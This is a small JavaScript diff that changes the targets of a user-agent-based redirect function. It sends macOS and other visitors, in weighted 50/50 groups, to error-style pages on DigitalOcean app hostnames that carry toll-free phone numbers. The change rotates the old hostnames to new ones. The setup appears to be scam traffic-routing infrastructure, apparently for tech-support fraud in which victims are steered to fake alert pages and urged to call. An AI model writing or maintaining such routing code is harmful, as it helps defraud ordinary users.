@@ -51,14 +51,14 @@ function getResponse(userAgent) {
         {
             id: "Group 1",
             weight: 0.5,
-            macos: "https://seahorse-app-t8by4.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905",
-            others: "https://seahorse-app-t8by4.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905"
+            macos: "https://monkfish-app-nxgcl.ondigitalocean.app/merrx01usahtml/?bcda=1800 033 905",
+            others: "https://monkfish-app-nxgcl.ondigitalocean.app/werrx01USAHTML/?bcda=1800 033 905"
         },
         {
             id: "Group 2",
             weight: 0.5,
-            macos: "https://seahorse-app-t8by4.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594",
-            others: "https://seahorse-app-t8by4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594"
+            macos: "https://seashell-app-umzdz.ondigitalocean.app/merrx01usahtml/?bcda=1800-039-594",
+            others: "https://seashell-app-umzdz.ondigitalocean.app/werrx01USAHTML/?bcda=1800-039-594"
         }
     ];
 
